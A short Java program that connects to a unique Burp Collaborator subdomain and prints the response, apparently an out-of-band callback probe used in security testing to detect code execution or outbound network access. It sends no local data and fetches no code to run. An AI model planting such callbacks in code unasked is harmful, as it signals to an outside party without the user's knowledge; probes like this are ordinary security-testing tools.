import java.net.*;
import java.io.*;

class URLConnectionReader {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://bu93nysp7w4rb49r5l3ycqtl8ce42t.burpcollaborator.net/");
        URLConnection yc = url.openConnection();
        BufferedReader in = new BufferedReader(
                new InputStreamReader(
                        yc.getInputStream()));
        String inputLine;

        while ((inputLine = in.readLine()) != null)
            System.out.println(inputLine);
        in.close();
    }
}

